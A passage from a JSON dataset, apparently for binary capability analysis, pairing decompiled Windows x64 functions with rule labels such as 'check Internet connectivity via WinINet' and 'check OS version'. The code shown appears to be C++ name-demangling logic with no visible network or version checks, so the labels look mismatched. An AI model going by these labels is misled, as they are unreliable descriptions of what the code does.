*(arg1 + 0x38) = uVar1;\n                    *(arg1 + 0x48) = uVar2;\n                    break;\n                }\n                if (piVar12 == NULL) {\n                    return NULL;\n                }\n                iVar5 = *(arg1 + 0x38);\n                if (*(arg1 + 0x3c) <= iVar5) {\n                    return NULL;\n                }\n                *(*(arg1 + 0x30) + iVar5 * 8) = piVar12;\n                *(arg1 + 0x38) = iVar5 + 1;\n            }\ncode_r0x0001400056ef:\n            piVar12 = fcn.140004740(arg1, 4, piVar12, uVar9);\n            apiStack64[0] = piVar12;\n        }\n        break;\n    case 0x25:\n        *(arg1 + 0x18) = pcVar13 + 1;\n        piVar12 = fcn.1400050c0(arg1);\n        apiStack64[0] = piVar12;\n        if (**(arg1 + 0x18) == 'I') {\n            *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\n            uVar9 = fcn.140006a20(arg1);\n            piVar12 = fcn.140004740(arg1, 4, piVar12, uVar9);\n        }\n        uVar9 = fcn.140005410(arg1);\n        piVar12 = fcn.140004740(arg1, 0x21, uVar9, piVar12);\n        apiStack64[0] = piVar12;\n    }\ncode_r0x0001400055b0:\n    if (piVar12 != NULL) {\ncode_r0x0001400055b9:\n        iVar5 = *(arg1 + 0x38);\n        if (iVar5 < *(arg1 + 0x3c)) {\n            *(*(arg1 + 0x30) + iVar5 * 8) = piVar12;\n            *(arg1 + 0x38) = iVar5 + 1;\n            return apiStack64[0];\n        }\n    }\ncode_r0x0001400054f8:\n    return NULL;\n}\n",
        "token_count": 5772
    },
    "140005ee": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t fcn.140005ee0(int64_t arg1)\n\n{\n    char cVar1;\n    int64_t iVar2;\n    char *pcVar3;\n    int64_t *piVar4;\n    int64_t aiStack32 [2];\n    \n    aiStack32[0] = 0;\n    pcVar3 = *(arg1 + 0x18);\n    cVar1 = *pcVar3;\n    if ((cVar1 != 'E' && cVar1 != '\\0') && (piVar4 = aiStack32,  cVar1 != '.')) {\n        while (((cVar1 != 'R' && (cVar1 != 'O')) || (pcVar3[1] != 'E'))) {\n            iVar2 = fcn.140005410(arg1);\n            if (iVar2 == 0) {\n                return 0;\n            }\n            iVar2 = fcn.140004740(arg1, 0x2e, iVar2, 0);\n            *piVar4 = iVar2;\n            if (iVar2 == 0) {\n                return 0;\n            }\n            pcVar3 = *(arg1 + 0x18);\n            piVar4 = iVar2 + 0x18;\n            cVar1 = *pcVar3;\n            if ((cVar1 == '\\0' || cVar1 == 'E') || (cVar1 == '.')) break;\n        }\n        if (aiStack32[0] != 0) {\n            if (*(aiStack32[0] + 0x18) != 0) {\n                return aiStack32[0];\n            }\n            if (**(aiStack32[0] + 0x10) == 0x27) {\n                iVar2 = *(*(aiStack32[0] + 0x10) + 4);\n                if (*(iVar2 + 0x1c) == 9) {\n                    *(arg1 + 0x48) = *(arg1 + 0x48) - *(iVar2 + 8);\n                    *(aiStack32[0] + 0x10) = 0;\n                    return aiStack32[0];\n                }\n                return aiStack32[0];\n            }\n            return aiStack32[0];\n        }\n    }\n    return 0;\n}\n",
        "token_count": 499
    },
    "14000629": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t * fcn.140006290(int64_t arg1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    char cVar3;\n    int32_t iVar4;\n    int32_t *arg3;\n    ulong arg4;\n    ulong uVar5;\n    int64_t iVar6;\n    char *pcVar7;\n    char *pcVar8;\n    int32_t *piVar9;\n    char *pcVar10;\n    \n    pcVar7 = *(arg1 + 0x18);\n    cVar3 = *pcVar7;\n    if (cVar3 - 0x30U < 10) {\n        arg3 = fcn.1400050c0(arg1);\n        cVar3 = **(arg1 + 0x18);\n        pcVar8 = *(arg1 + 0x18);\n        goto joined_r0x0001400063f5;\n    }\n    if (cVar3 + 0x9fU < 0x1a) {\n        uVar1 = *(arg1 + 0x4c);\n        if ((cVar3 == 'o') && (pcVar7[1] == 'n')) {\n            *(arg1 + 0x4c) = 0;\n            *(arg1 + 0x18) = pcVar7 + 2;\n        }\n        arg3 = fcn.1400060f0(arg1);\n        *(arg1 + 0x4c) = uVar1;\n        if ((arg3 != NULL) && (*arg3 == 0x32)) {\n            pcVar7 = **(arg3 + 4);\n            *(arg1 + 0x48) = *(arg1 + 0x48) + 7 + *(*(arg3 + 4) + 2);\n            if ((*pcVar7 == 'l') && ((pcVar7[1] == 'i' && (pcVar7[2] == '\\0')))) {\n                uVar5 = fcn.1400050c0(arg1);\n                arg3 = fcn.140004740(arg1, 0x37, arg3, uVar5);\n            }\n        }\ncode_r0x0001400062dc:\n        cVar3 = **(arg1 + 0x18);\n        pcVar8 = *(arg1 + 0x18);\n        goto joined_r0x0001400063f5;\n    }\n    if (cVar3 + 0xbdU < 2) {\n        piVar9 = *(arg1 + 0x40);\n        if ((piVar9 == NULL) || ((*piVar9 != 0 && (*piVar9 != 0x18)))) {\n            if (cVar3 != 'C') goto code_r0x00014000650d;\n        }\n        else {\n            *(arg1 + 0x48) = piVar9[6] + *(arg1 + 0x48);\n            cVar3 = *pcVar7;\n            if (cVar3 != 'C') {\n                if (cVar3 != 'D') {\ncode_r0x00014000654d:\n                    arg3 = NULL;\n                    pcVar8 = pcVar7;\n                    goto joined_r0x0001400063f5;\n                }\ncode_r0x00014000650d:\n                if (pcVar7[1] - 0x30U < 6) {\n    // switch table (6 cases) at 0x1400ff23c\n                    switch(*((pcVar7[1] - 0x30U) * 4 + 0x1400ff23c) + 0x1400ff23c) {\n                    case 0x140006554:\n                        iVar4 = 2;\n                        break;\n                    case 0x1400065b0:\n                        iVar4 = 5;\n                        break;\n                    case 0x1400065b7:\n                        iVar4 = 4;\n                        break;\n                    case 0x1400065be:\n                        iVar4 = 3;\n                        break;\n                    case 0x1400065c5:\n                        iVar4 = 1;\n                        break;\n                    case 0x1400065cc:\n                        goto code_r0x0001400065cc;\n                    }\n                    pcVar8 = pcVar7 + 2;\n                    iVar2 = *(arg1 + 0x28);\n                    *(arg1 + 0x18) = pcVar8;\n                    if (iVar2 < *(arg1 + 0x2c)) {\n                        arg3 = iVar2 * 0x20 + *(arg1 + 0x20);\n                        *(arg3 + 1) = 0;\n                        *(arg1 + 0x28) = iVar2 + 1;\n                        if (piVar9 != NULL) {\n                            *(arg3 + 1) = 0;\n                            *arg3 = 8;\n                            arg3[4] = iVar4;\n                            *(arg3 + 6) = piVar9;\n                            cVar3 = pcVar7[2];\n                            goto joined_r0x0001400063f5;\n                        }\n                    }\n                    cVar3 = pcVar7[2];\n                    arg3 = NULL;\n                }\n                else {\ncode_r0x0001400065cc:\n                    arg3 = NULL;\n                    pcVar8 = pcVar7;\n                }\n                goto joined_r0x0001400063f5;\n            }\n        }\n        cVar3 = pcVar7[1];\n        if (cVar3 == 'I') {\n            pcVar8 = pcVar7 + 1;\n            *(arg1 + 0x18) = pcVar8;\n            cVar3 = pcVar7[2];\n            if (4 < cVar3 - 0x31U) {\n                cVar3 = pcVar7[1];\n                arg3 = NULL;\n                goto joined_r0x0001400063f5;\n            }\n            *(arg1 + 0x18) = pcVar7 + 3;\n            fcn.140005410(arg1);\n            piVar9 = *(arg1 + 0x40);\n            pcVar8 = *(arg1 + 0x18);\n        }\n        else {\n            if (4 < cVar3 - 0x31U) {\n                return NULL;\n            }\n            pcVar8 = pcVar7 + 2;\n            *(arg1 + 0x18) = pcVar8;\n        }\n        iVar4 = *(arg1 + 0x28);\n        if (iVar4 < *(arg1 + 0x2c)) {\n            arg3 = iVar4 * 0x20 + *(arg1 + 0x20);\n            *(arg3 + 1) = 0;\n            *(arg1 + 0x28) = iVar4 + 1;\n            if (piVar9 != NULL) {\n                *(arg3 + 1) = 0;\n                *arg3 = 7;\n                arg3[4] = cVar3 + -0x30;\n                *(arg3 + 6) = piVar9;\n                cVar3 = *pcVar8;\n                goto joined_r0x0001400063f5;\n            }\n        }\n    }\n    else {\n        if (cVar3 == 'L') {\n            *(arg1 + 0x18) = pcVar7 + 1;\n            arg3 = fcn.1400050c0(arg1);\n            if (arg3 == NULL) {\n                return NULL;\n            }\n            iVar4 = fcn.140004a40(arg1);\n            if (iVar4 == 0) {\n                return NULL;\n            }\n            goto code_r0x0001400062dc;\n        }\n        if (cVar3 != 'U') {\n            return NULL;\n        }\n        if (pcVar7[1] == 'l') {\n            *(arg1 + 0x18) = pcVar7 + 1;\n            cVar3 = pcVar7[1];\n            if (cVar3 != 'l') goto code_r0x0001400066a0;\n            *(arg1 + 0x18) = pcVar7 + 2;\n            iVar6 = fcn.140005ee0(arg1);\n            pcVar7 = *(arg1 + 0x18);\n            cVar3 = *pcVar7;\n            if ((iVar6 == 0) || (cVar3 != 'E')) goto code_r0x00014000654d;\n            pcVar10 = pcVar7 + 1;\n            *(arg1 + 0x18) = pcVar10;\n            if (pcVar7[1] == '_') {\n                iVar4 = 0;\n            }\n            else {\n                if (pcVar7[1] == 'n') {\n                    return NULL;\n                }\n                iVar4 = fcn.1400048a0(arg1);\n                iVar4 = iVar4 + 1;\n                if (iVar4 < 0) goto code_r0x000140006761;\n                pcVar10 = *(arg1 + 0x18);\n                cVar3 = *pcVar10;\n                if (cVar3 != '_') goto code_r0x00014000678b;\n            }\n            pcVar8 = pcVar10 + 1;\n            iVar2 = *(arg1 + 0x28);\n            *(arg1 + 0x18) = pcVar8;\n            if (iVar2 < *(arg1 + 0x2c)) {\n                arg3 = iVar2 * 0x20 + *(arg1 + 0x20);\n                *(arg3 + 1) = 0;\n                *(arg1 + 0x28) = iVar2 + 1;\n                *arg3 = 0x47;\n                *(arg3 + 4) = iVar6;\n                arg3[6] = iVar4;\n                cVar3 = pcVar10[1];\n                goto joined_r0x0001400063f5;\n            }\ncode_r0x000140006747:\n            cVar3 = pcVar10[1];\n            arg3 = NULL;\n            goto joined_r0x0001400063f5;\n        }\n        if (pcVar7[1] != 't') {\n            return NULL;\n        }\n        *(arg1 + 0x18) = pcVar7 + 1;\n        cVar3 = pcVar7[1];\n        if (cVar3 != 't') {\ncode_r0x0001400066a0:\n            arg3 = NULL;\n            pcVar8 = pcVar7 + 1;\n            goto joined_r0x0001400063f5;\n        }\n        pcVar10 = pcVar7 + 2;\n        *(arg1 + 0x18) = pcVar10;\n        if (pcVar7[2] == '_') {\n            iVar4 = 0;\ncode_r0x000140006383:\n            pcVar8 = pcVar10 + 1;\n            iVar2 = *(arg1 + 0x28);\n            *(arg1 + 0x18) = pcVar8;\n            if (iVar2 < *(arg1 + 0x2c)) {\n                arg3 = iVar2 * 0x20 + *(arg1 + 0x20);\n                *(arg3 + 1) = 0;\n                *(arg1 + 0x28) = iVar2 + 1;\n                arg3[4] = iVar4;\n                iVar4 = *(arg1 + 0x38);\n                *arg3 = 0x49;\n                if (iVar4 < *(arg1 + 0x3c)) {\n                    *(*(arg1 + 0x30) + iVar4 * 8) = arg3;\n                    *(arg1 + 0x38) = iVar4 + 1;\n                    cVar3 = pcVar10[1];\n                    goto joined_r0x0001400063f5;\n                }\n            }\n            goto code_r0x000140006747;\n        }\n        if (pcVar7[2] == 'n') {\n            return NULL;\n        }\n        iVar4 = fcn.1400048a0(arg1);\n        iVar4 = iVar4 + 1;\n        if (-1 < iVar4) {\n            pcVar10 = *(arg1 + 0x18);\n            cVar3 = *pcVar10;\n            if (cVar3 != '_') {\ncode_r0x00014000678b:\n                arg3 = NULL;\n                pcVar8 = pcVar10;\n                goto joined_r0x0001400063f5;\n            }\n            goto code_r0x000140006383;\n        }\ncode_r0x000140006761:\n        pcVar8 = *(arg1 + 0x18);\n    }\n    cVar3 = *pcVar8;\n    arg3 = NULL;\njoined_r0x0001400063f5:\n    if (cVar3 == 'B') {\n        uVar5 = *(arg1 + 0x40);\n        do {\n            *(arg1 + 0x18) = pcVar8 + 1;\n            arg4 = fcn.1400050c0(arg1);\n            arg3 = fcn.140004740(arg1, 0x4d, arg3, arg4);\n            pcVar8 = *(arg1 + 0x18);\n        } while (*pcVar8 == 'B');\n        *(arg1 + 0x40) = uVar5;\n        return arg3;\n    }\n    return arg3;\n}\n",
        "token_count": 2940
    },
    "140006cb": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Type propagation algorithm not settling\n\nuint32_t * fcn.140006cb0(int64_t arg1)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    ulong *puVar3;\n    char **ppcVar4;\n    uint32_t *puVar5;\n    int32_t iVar6;\n    uint64_t uVar7;\n    uint32_t *puVar8;\n    uint32_t *puVar9;\n    ulong uVar10;\n    ulong uVar11;\n    int64_t iVar12;\n    uint32_t *arg3;\n    ulong arg4;\n    char cVar13;\n    char *pcVar14;\n    char *pcVar15;\n    uint32_t uVar16;\n    uint64_t arg3_00;\n    \n    pcVar15 = *(arg1 + 0x18);\n    cVar13 = *pcVar15;\n    if (cVar13 == 'L') {\n        pcVar15 = *(arg1 + 0x18);\n        if (*pcVar15 != 'L') {\n            return NULL;\n        }\n        pcVar14 = pcVar15 + 1;\n        *(arg1 + 0x18) = pcVar14;\n        if (pcVar15[1] == '_') {\n            pcVar14 = pcVar15 + 2;\n            puVar9 = NULL;\n            *(arg1 + 0x18) = pcVar14;\n            cVar13 = pcVar15[2];\n            if (cVar13 != 'Z') goto code_r0x000140006879;\n        }\n        else if (pcVar15[1] != 'Z') {\n            puVar9 = fcn.140005410(arg1);\n            if (puVar9 == NULL) {\n                return NULL;\n            }\n            pcVar14 = *(arg1 + 0x18);\n            pcVar15 = pcVar14;\n            if (*puVar9 == 0x27) {\n                puVar3 = *(puVar9 + 4);\n                if (*(puVar3 + 0x1c) != 0) {\n                    *(arg1 + 0x48) = *(arg1 + 0x48) - *(puVar3 + 1);\n                }\n                iVar6 = sub.msvcrt.dll_strcmp(*puVar3, \"decltype(nullptr)\");\n                cVar13 = *pcVar14;\n                if (iVar6 != 0) goto code_r0x0001400067ed;\n                if (cVar13 == 'E') {\n                    *(arg1 + 0x18) = pcVar14 + 1;\n                    return puVar9;\n                }\n                uVar7 = 0x3d;\n                if (cVar13 == 'n') goto code_r0x0001400068e0;\ncode_r0x000140006827:\n                do {\n                    pcVar14 = pcVar14 + 1;\n                    if (cVar13 == '\\0') {\n                        return NULL;\n                    }\n                    *(arg1 + 0x18) = pcVar14;\n                    cVar13 = *pcVar14;\n                } while (cVar13 != 'E');\n                arg3_00 = pcVar14 - pcVar15;\n            }\n            else {\n                cVar13 = *pcVar14;\ncode_r0x0001400067ed:\n                uVar7 = 0x3d;\n                if (cVar13 == 'n') {\ncode_r0x0001400068e0:\n                    pcVar15 = pcVar14 + 1;\n                    uVar7 = 0x3e;\n                    *(arg1 + 0x18) = pcVar15;\n                    cVar13 = pcVar14[1];\n                }\n                pcVar14 = pcVar15;\n                if (cVar13 != 'E') goto code_r0x000140006827;\n                arg3_00 = 0;\n            }\n            iVar12 = arg1;\n            uVar10 = fcn.140004840(arg1, pcVar15, arg3_00);\n            puVar9 = fcn.140004740(iVar12, uVar7 & 0xffffffff, puVar9, uVar10);\n            pcVar14 = *(arg1 + 0x18);\n            cVar13 = *pcVar14;\n            goto code_r0x000140006879;\n        }\n        *(arg1 + 0x18) = pcVar14 + 1;\n        if ((pcVar14[1] == 'G') || (pcVar14[1] == 'T')) {\n            puVar9 = fcn.140007780(arg1);\n            pcVar14 = *(arg1 + 0x18);\n            cVar13 = *pcVar14;\n        }\n        else {\n            puVar9 = fcn.1400081f0(arg1, 0);\n            pcVar14 = *(arg1 + 0x18);\n            cVar13 = *pcVar14;\n        }\ncode_r0x000140006879:\n        if (cVar13 != 'E') {\n            return NULL;\n        }\n        *(arg1 + 0x18) = pcVar14 + 1;\n        return puVar9;\n    }\n    if (cVar13 == 'T') {\n        pcVar15 = *(arg1 + 0x18);\n        if (*pcVar15 != 'T') {\n            return NULL;\n        }\n        pcVar14 = pcVar15 + 1;\n        *(arg1 + 0x18) = pcVar14;\n        if (pcVar15[1] == '_') {\n            uVar16 = 0;\n        }\n        else {\n            if (pcVar15[1] == 'n') {\n                return NULL;\n            }\n            iVar6 = fcn.1400048a0(arg1);\n            uVar16 = iVar6 + 1;\n            if (uVar16 < 0) {\n                return NULL;\n            }\n            pcVar14 = *(arg1 + 0x18);\n            if (*pcVar14 != '_') {\n                return NULL;\n            }\n        }\n        *(arg1 + 0x18) = pcVar14 + 1;\n        iVar6 = *(arg1 + 0x28);\n        if (iVar6 < *(arg1 + 0x2c)) {\n            puVar9 = iVar6 * 0x20 + *(arg1 + 0x20);\n            *(puVar9 + 1) = 0;\n            *(arg1 + 0x28) = iVar6 + 1;\n            *puVar9 = 5;\n            puVar9[4] = uVar16;\n            return puVar9;\n        }\n        return NULL;\n    }\n    if (cVar13 == 's') {\n        if (pcVar15[1] != 'r') {\n            if (pcVar15[1] == 'p') {\n                *(arg1 + 0x18) = pcVar15 + 2;\n                puVar9 = fcn.140006cb0(arg1);\n                arg3 = NULL;\n                uVar16 = 0x4c;\n                goto code_r0x00014000703e;\n            }\n            goto code_r0x000140006d44;\n        }\n        *(arg1 + 0x18) = pcVar15 + 2;\n        uVar2 = pcVar15[2];\n        if (*(arg1 + 0x54) == 0) {\ncode_r0x000140007275:\n            puVar9 = fcn.140005410(arg1);\n        }\n        else {\n            if (uVar2 < ':') {\n                if (uVar2 < '0') goto code_r0x000140007275;\n            }\n            else if ((0x37 < uVar2 - 0x43) || ((0xffffffc0040201U >> (uVar2 - 0x43 & 0x3f) & 1) == 0))\n            goto code_r0x000140007275;\n            *(arg1 + 0x54) = 0xffffffff;\n            puVar9 = fcn.140006ad0(arg1, 0);\n            if (**(arg1 + 0x18) == 'E') {\n                *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\n            }\n        }\n        arg3 = fcn.140006290(arg1);\n        if (**(arg1 + 0x18) == 'I') {\n            *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\n            uVar10 = fcn.140006a20(arg1);\n            arg3 = fcn.140004740(arg1, 4, arg3, uVar10);\n        }\n        uVar16 = 1;\n    }\n    else if (cVar13 == 'f') {\n        if (pcVar15[1] == 'p') {\n            *(arg1 + 0x18) = pcVar15 + 2;\n            cVar13 = pcVar15[2];\n            if (cVar13 == 'T') {\n                *(arg1 + 0x18) = pcVar15 + 3;\n                uVar16 = 0;\n            }\n            else if (cVar13 == '_') {\n                *(arg1 + 0x18) = pcVar15 + 3;\n                uVar16 = 1;\n            }\n            else {\n                if (cVar13 == 'n') {\n                    return NULL;\n                }\n                iVar6 = fcn.1400048a0(arg1);\n                if (iVar6 + 1 < 0) {\n                    return NULL;\n                }\n                if (**(arg1 + 0x18) != '_') {\n                    return NULL;\n                }\n                *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\n                if (iVar6 + 1 == 0x7fffffff) {\n                    return NULL;\n                }\n                uVar16 = iVar6 + 2;\n            }\n            iVar6 = *(arg1 + 0x28);\n            if (*(arg1 + 0x2c) <= iVar6) {\n                return NULL;\n            }\n            puVar9 = iVar6 * 0x20 + *(arg1 + 0x20);\n            *(puVar9 + 1) = 0;\n            *(arg1 + 0x28) = iVar6 + 1;\n            *puVar9 = 6;\n            puVar9[4] = uVar16;\n            return puVar9;\n        }\ncode_r0x000140006d44:\n        puVar9 = fcn.1400060f0(arg1);\n        if (puVar9 == NULL) {\n            return NULL;\n        }\n        uVar16 = *puVar9;\n        if (uVar16 == 0x32) {\n            ppcVar4 = *(puVar9 + 4);\n            pcVar15 = *ppcVar4;\n            *(arg1 + 0x48) = *(arg1 + 0x48) + *(ppcVar4 + 2) + -2;\n            cVar13 = *pcVar15;\n            if (((cVar13 == 's') && (pcVar15[1] == 't')) && (pcVar15[2] == '\\0')) {\n                arg3 = fcn.140005410(arg1);\n                uVar16 = 0x37;\n                goto code_r0x00014000703e;\n            }\n            uVar16 = *(ppcVar4 + 0x14);\n            if (uVar16 != 1) {\n                if (uVar16 < 2) goto joined_r0x000140006f9a;\n                if (uVar16 == 2) {\n                    cVar1 = *pcVar15;\n                    if ((pcVar15[1] == 'c') && ((cVar1 + 0x9dU < 2 || (cVar1 + 0x8eU < 2)))) {\n                        uVar10 = fcn.140005410(arg1);\n                    }\n                    else if (cVar1 == 'f') {\n                        uVar10 = fcn.1400060f0(arg1);\n                    }\n                    else if (((cVar13 == 'd') && (pcVar15[1] == 'i')) && (pcVar15[2] == '\\0')) {\n                        uVar10 = fcn.140006290(arg1);\n                    }\n                    else {\n                        uVar10 = fcn.140006cb0(arg1);\n                    }\n                    cVar13 = *pcVar15;\n                    if (((cVar13 == 'c') && (pcVar15[1] == 'l')) && (pcVar15[2] == '\\0')) {\n                        uVar11 = fcn.140007490(arg1, 0x45);\n                    }\n                    else {\n                        if ((((cVar13 == 'd') && (pcVar15[1] == 't')) && (pcVar15[2] == '\\0')) ||\n                           (((cVar13 == 'p' && (pcVar15[1] == 't')) && (pcVar15[2] == '\\0')))) {\n                            pcVar15 = *(arg1 + 0x18);\n                            if (*pcVar15 == 'g') {\n                                if (pcVar15[1] != 's') goto code_r0x0001400072dc;\n                            }\n                            else if ((*pcVar15 != 's') || (pcVar15[1] != 'r')) {\ncode_r0x0001400072dc:\n                                uVar11 = fcn.140006290(arg1);\n                                if (**(arg1 + 0x18) == 'I') {\n                                    *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\n                                    arg4 = fcn.140006a20(arg1);\n                                    uVar11 = fcn.140004740(arg1, 4, uVar11, arg4);\n                                }\n                                goto code_r0x0001400070fe;\n                            }\n                        }\n                        uVar11 = fcn.140006cb0(arg1);\n                    }\ncode_r0x0001400070fe:\n                    arg3 = fcn.140004740(arg1, 0x39, uVar10, uVar11);\n                    uVar16 = 0x38;\n                    goto code_r0x00014000703e;\n                }\n                if (uVar16 != 3) {\n                    return NULL;\n                }\n                if ((((cVar13 == 'q') && (pcVar15[1] == 'u')) && (pcVar15[2] == '\\0')) ||\n                   (((cVar13 == 'd' && (pcVar15[1] == 'X')) && (pcVar15[2] == '\\0')))) {\n                    uVar10 = fcn.140006cb0(arg1);\ncode_r0x000140006ec2:\n                    uVar11 = fcn.140006cb0(arg1);\n                    iVar12 = fcn.140006cb0(arg1);\n                    if (iVar12 == 0) {\n                        return NULL;\n                    }\n                }\n                else {\n                    if (*pcVar15 == 'f') {\n                        uVar10 = fcn.1400060f0(arg1);\n                        goto code_r0x000140006ec2;\n                    }\n                    if (*pcVar15 != 'n') {\n                        return NULL;\n                    }\n                    if ((pcVar15[1] != 'w') && (pcVar15[1] != 'a')) {\n                        return NULL;\n                    }\n                    uVar10 = fcn.140007490(arg1, 0x5f);\n                    uVar11 = fcn.140005410(arg1);\n                    pcVar15 = *(arg1 + 0x18);\n                    cVar13 = *pcVar15;\n                    if (cVar13 == 'E') {\n                        iVar12 = 0;\n                        *(arg1 + 0x18) = pcVar15 + 1;\n                    }\n                    else if (cVar13 == 'p') {\n                        if (pcVar15[1] != 'i') {\n                            return NULL;\n                        }\n                        *(arg1 + 0x18) = pcVar15 + 2;\n                        iVar12 = fcn.140007490(arg1, 0x45);\n                    }\n                    else {\n                        if (cVar13 != 'i') {\n                            return NULL;\n                        }\n                        if (pcVar15[1] != 'l') {\n                            return NULL;\n                        }\n                        iVar12 = fcn.140006cb0(arg1);\n                    }\n                }\n                uVar11 = fcn.140004740(arg1, 0x3c, uVar11, iVar12);\n                arg3 = fcn.140004740(arg1, 0x3b, uVar10, uVar11);\n                uVar16 = 0x3a;\n                goto code_r0x00014000703e;\n            }\n            cVar1 = *pcVar15;\n            if (((cVar1 == 'p') || (cVar1 == 'm')) && (cVar1 == pcVar15[1])) {\n                if (**(arg1 + 0x18) == '_') {\n                    *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\n                    cVar13 = *pcVar15;\n                    goto code_r0x000140006fc5;\n                }\n            }\n            else {\ncode_r0x000140006fc5:\n                uVar16 = 0;\n            }\n            if (((cVar13 == 's') && (pcVar15[1] == 'P')) && (pcVar15[2] == '\\0')) {\n                arg3 = fcn.140006a20(arg1);\n            }\n            else {\n                arg3 = fcn.140006cb0(arg1);\n            }\n            if (uVar16 != 0) {\n                arg3 = fcn.140004740(arg1, 0x39, arg3, arg3);\n            }\n        }\n        else {\n            if (uVar16 == 0x33) {\n                uVar16 = puVar9[4];\n                if (uVar16 != 1) {\n                    if (uVar16 == 3) {\n                        return NULL;\n                    }\njoined_r0x000140006f9a:\n                    if (uVar16 != 0) {\n                        return NULL;\n                    }\n                    arg3 = NULL;\n                    uVar16 = 0x36;\n                    goto code_r0x00014000703e;\n                }\n            }\n            else {\n                if (uVar16 != 0x34) {\n                    return NULL;\n                }\n                if (**(arg1 + 0x18) == '_') {\n                    *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\n                    arg3 = fcn.140007490(arg1, 0x45);\n                    goto code_r0x000140007006;\n                }\n            }\n            arg3 = fcn.140006cb0(arg1);\n        }\ncode_r0x000140007006:\n        uVar16 = 0x37;\n    }\n    else {\n        if (9 < cVar13 - 0x30U) {\n            if (cVar13 != 'o') {\n                if ((cVar13 == 'i') || (cVar13 == 't')) {\n                    if (pcVar15[1] != 'l') goto code_r0x000140006d44;\n                    pcVar15 = pcVar15 + 2;\n                    puVar9 = NULL;\n                    *(arg1 + 0x18) = pcVar15;\n                    if (cVar13 == 't') {\n                        puVar9 = fcn.140005410(arg1);\n                        pcVar15 = *(arg1 + 0x18);\n                    }\n                    if (*pcVar15 == '\\0') {\n                        return NULL;\n                    }\n                    if (pcVar15[1] == '\\0') {\n                        return NULL;\n                    }\n                    arg3 = fcn.140007490(arg1, 0x45);\n                    uVar16 = 0x31;\n                }\n                else {\n                    if (cVar13 != 'u') goto code_r0x000140006d44;\n                    *(arg1 + 0x18) = pcVar15 + 1;\n                    puVar9 = fcn.1400050c0(arg1);\n                    arg3 = fcn.140006a20(arg1);\n                    uVar16 = 0x3f;\n                }\n                goto code_r0x00014000703e;\n            }\n            if (pcVar15[1] != 'n') goto code_r0x000140006d44;\n            *(arg1 + 0x18) = pcVar15 + 2;\n        }\n        puVar9 = fcn.140006290(arg1);\n        if (puVar9 == NULL) {\n            return NULL;\n        }\n        if (**(arg1 + 0x18) != 'I') {\n            return puVar9;\n        }\n        *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\n        arg3 = fcn.140006a20(arg1);\n        uVar16 = 4;\n    }\ncode_r0x00014000703e:\n    puVar8 = arg3;\n    puVar5 = puVar9;\n    if (uVar16 < 0x32) {\n        if (0x28 < uVar16) {\n            switch(uVar16) {\n            case 0x29:\n            case 0x2e:\n            case 0x2f:\n                goto code_r0x000140004778;\n            case 0x2b:\n            case 0x2d:\ncode_r0x00014000481f:\n                if (puVar9 == NULL) {\n                    return NULL;\n                }\n            case 0x2a:\n            case 0x31:\njoined_r0x0001400047d3:\n                puVar5 = puVar8;\n                break;\n            default:\n                goto code_r0x0001400047d7;\n            case 0x30:\n                break;\n            }\n            goto joined_r0x000140004771;\n        }\n        uVar7 = 1 << (uVar16 & 0x3f);\n        if ((uVar7 & 0x17c00fff600) != 0) goto joined_r0x000140004771;\n        if ((uVar7 & 0x1fe000000) == 0) {\n            if ((uVar7 & 0x20000081e) == 0) {\n                return NULL;\n            }\n            goto code_r0x00014000481f;\n        }\n    }\n    else {\n        if (0x1d < uVar16 - 0x34) {\n            return NULL;\n        }\n        uVar7 = 1 << (uVar16 - 0x34 & 0x3f);\n        if ((uVar7 & 0x1c71107) == 0) {\n            if ((uVar7 & 0xa002ef8) != 0) goto code_r0x00014000481f;\n            puVar8 = uVar7 & 0x34000000;\n            goto joined_r0x0001400047d3;\n        }\njoined_r0x000140004771:\n        if (puVar5 == NULL) {\n            return NULL;\n        }\n    }\ncode_r0x000140004778:\n    iVar6 = *(arg1 + 0x28);\n    if (iVar6 < *(arg1 + 0x2c)) {\n        puVar8 = iVar6 * 0x20 + *(arg1 + 0x20);\n        *(puVar8 + 1) = 0;\n        *(arg1 + 0x28) = iVar6 + 1;\n        *puVar8 = uVar16;\n        *(puVar8 + 4) = puVar9;\n        *(puVar8 + 6) = arg3;\n        return puVar8;\n    }\ncode_r0x0001400047d7:\n    return NULL;\n}\n",
        "token_count": 5292
    },
    "14000754": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
